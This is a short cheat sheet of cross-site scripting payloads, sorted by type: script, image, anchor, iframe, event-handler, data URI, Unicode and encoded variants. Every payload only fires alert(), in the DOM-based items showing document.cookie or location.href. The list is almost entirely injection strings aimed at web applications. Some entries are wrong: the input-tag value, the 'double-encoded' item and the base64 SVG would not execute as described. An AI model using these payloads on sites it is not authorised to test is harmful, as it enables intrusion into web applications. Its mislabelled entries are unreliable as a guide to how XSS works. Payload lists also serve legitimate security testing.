HTML Injection:

Basic XSS Payload: <script>alert('XSS');</script>
Image Tag XSS: <img src="javascript:alert('XSS')">
Anchor Tag XSS: <a href="javascript:alert('XSS')">Click me</a>
Iframe Tag XSS: <iframe src="javascript:alert('XSS')"></iframe>
Input Tag XSS: <input type="text" value="javascript:alert('XSS')">
DOM-based XSS:

DOM-based XSS Payload: "><script>alert(document.cookie)</script>
Location-based XSS Payload: "><script>alert(location.href)</script>
Reflected XSS:

Reflected XSS Payload: "><script>alert('XSS')</script>
Stored (Persistent) XSS:

Stored XSS Payload: <script>alert('XSS')</script>
Image-based Stored XSS: <img src="x" onerror="alert('XSS')">
JavaScript Event Handlers:

Event Handler XSS Payload: <img src="x" onerror="alert('XSS')">
Mouseover Event XSS: <img src="x" onmouseover="alert('XSS')">
JavaScript Code Execution:

JavaScript Code Execution Payload: ";alert('XSS');//
Document Object Model (DOM) Manipulation:

DOM Manipulation Payload: document.getElementById('target').innerHTML = '<script>alert("XSS")</script>';
Data URI XSS:

Data URI XSS Payload: <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxmb3JtIGFjdGlvbj0iRG9jdW1lbnQiIHN0eWxlPSJ3aWR0aDogMTAwJTsgaGVpZ2h0OiAxMDAlOyIgc3JjPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGNsaXBQYXRoIGlkPSJsaW5lIiBzdHlsZT0iZm9udC1zaXplOjEycHgiIGZpbGw9Im5vbmUiPjwvY2xpcFBhdGg+PC9mb3JtPjwvc3ZnPg==">
Unicode XSS:

Unicode XSS Payload: <script>alert('\u0058\u0053\u0053')</script>
Double-Encoded XSS:

Double-Encoded XSS Payload: &lt;script&gt;alert('XSS')&lt;/script&gt;